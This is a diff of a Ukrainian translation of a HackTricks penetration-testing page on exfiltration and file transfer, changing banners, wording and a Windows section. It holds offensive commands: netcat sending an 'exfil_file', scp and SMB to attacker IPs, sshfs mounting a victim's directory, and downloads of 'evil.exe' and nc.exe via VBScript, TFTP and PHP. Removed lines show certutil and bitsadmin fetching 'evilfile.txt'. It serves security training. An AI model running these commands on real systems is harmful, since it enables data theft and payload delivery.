@@ -1,18 +1,19 @@
 # Ексфільтрація
 
+{% hint style="success" %}
+Вивчайте та практикуйте взлом AWS: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Школа взлому HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Вивчайте та практикуйте взлом GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Школа взлому HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Підтримайте HackTricks</summary>
 
-Інші способи підтримки HackTricks:
-
-* Якщо ви хочете побачити вашу **компанію рекламовану в HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
-* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
-* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
-* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) **і** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **репозиторіїв на GitHub**.
+* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
+* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Поширюйте хакерські трюки, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на GitHub.
 
 </details>
+{% endhint %}
 
 **Група Try Hard Security**
 
@@ -187,27 +188,27 @@ service smbd restart
 ```
 Windows
 
+---
+
 ### Exfiltration
 
-#### Bitsadmin
-```plaintext
-bitsadmin /transfer myjob /download /priority normal http://www.example.com/evilfile.txt C:\path\to\save\evilfile.txt
-```
+Exfiltration is the unauthorized transfer of data from a target. There are various methods to exfiltrate data from a compromised system, including:
 
-#### Certutil
-```plaintext
-certutil -urlcache -split -f http://www.example.com/evilfile.txt evilfile.txt
-```
+- **Compression**: Compressing data before exfiltration can help evade detection.
+- **Encryption**: Encrypting data can prevent unauthorized access if the exfiltrated data is intercepted.
+- **Steganography**: Hiding data within other files or messages can help avoid detection.
+- **Protocol Tunneling**: Using protocols such as DNS or HTTP to tunnel data out of a network can bypass security controls.
+- **Data Exfiltration Tools**: Utilizing specialized tools designed for data exfiltration can simplify the process.
 
-#### PowerShell
-```plaintext
-powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://www.example.com/evilfile.txt', 'C:\path\to\save\evilfile.txt')"
-```
+Exfiltration can occur over various channels, including:
 
-#### WMIC
-```plaintext
-wmic process call create "cmd.exe /c bitsadmin /transfer myjob /download /priority normal http://www.example.com/evilfile.txt C:\path\to\save\evilfile.txt"
-```
+- **Email**: Sending data as email attachments.
+- **DNS**: Using DNS queries to exfiltrate data.
+- **HTTP/HTTPS**: Sending data over HTTP or HTTPS connections.
+- **FTP**: Transferring data using FTP protocols.
+- **Cloud Storage**: Uploading data to cloud storage services.
+
+It is essential for security professionals to understand exfiltration techniques to better protect against data breaches.
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -223,7 +224,7 @@ scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-Якщо жертва має SSH, зловмисник може змонтувати каталог з жертви на себе.
+Якщо жертва має SSH, зловмисник може змонтувати каталог з жертви на зловмисника.
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -231,7 +232,7 @@ sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP addre
 ```
 ## NC
 
-Netcat (nc) - універсальна утиліта для зчитування та запису даних через мережу.
+NC (Netcat) - універсальний інструмент для зчитування та записування даних через мережу. Він може бути використаний для встановлення зв'язку з віддаленими системами, створення зворотного з'єднання та тунелювання мережевого трафіку. Netcat може бути корисним для ексфільтрації даних під час тестування на проникнення.
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
@@ -280,7 +281,7 @@ sudo python -m smtpd -n -c DebuggingServer :25
 
 За замовчуванням у XP та 2003 (в інших потрібно явно додати під час встановлення)
 
-У Kali, **запустіть TFTP сервер**:
+У Kali **запустіть TFTP-сервер**:
 ```bash
 #I didn't get this options working and I prefer the python option
 mkdir /tftp
@@ -298,15 +299,13 @@ tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-Завантажте файл за допомогою PHP oneliner:
+Завантажте файл за допомогою однорядкового PHP:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
 ## VBScript
 
-### VBScript
-
-VBScript (Visual Basic Scripting Edition) - це мова сценаріїв, яка використовується для розробки веб-сценаріїв та автоматизації завдань у середовищі Windows. VBScript може бути використаний для створення шкідливих сценаріїв, які виконуються на комп'ютері потенційною жертвою.
+## VBScript
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
@@ -344,32 +343,37 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Програма `debug.exe` не тільки дозволяє переглядати бінарні файли, але також має **можливість перебудовувати їх з шістнадцяткового коду**. Це означає, що, надаючи шістнадцятковий код бінарного файлу, `debug.exe` може згенерувати файл. Проте важливо зауважити, що у debug.exe є **обмеження на збирання файлів розміром до 64 кб**.
+Програма `debug.exe` не тільки дозволяє переглядати бінарні файли, але також має **можливість перебудовувати їх з шістнадцяткового коду**. Це означає, що, надавши шістнадцятковий код бінарного файлу, `debug.exe` може згенерувати бінарний файл. Однак важливо зауважити, що у `debug.exe` є **обмеження на збирання файлів розміром до 64 кб**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
+Потім скопіюйте текст у вікно-оболонку та буде створено файл з назвою nc.exe.
+
+* [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
+
 ## DNS
 
 * [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)
 
-**Група з безпеки Try Hard Security**
+**Try Hard Security Group**
 
 <figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
+{% hint style="success" %}
+Навчайтесь та вправляйтесь у взломі AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Навчання HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Навчайтесь та вправляйтесь у взломі GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Навчання HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Підтримайте HackTricks</summary>
 
-Інші способи підтримки HackTricks:
-
-* Якщо ви хочете побачити вашу **компанію рекламовану в HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
-* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
-* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
-* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) **і** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **репозиторіїв на GitHub.**
+* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
+* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Поширюйте хакерські трюки, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв GitHub.
 
 </details>
+{% endhint %}
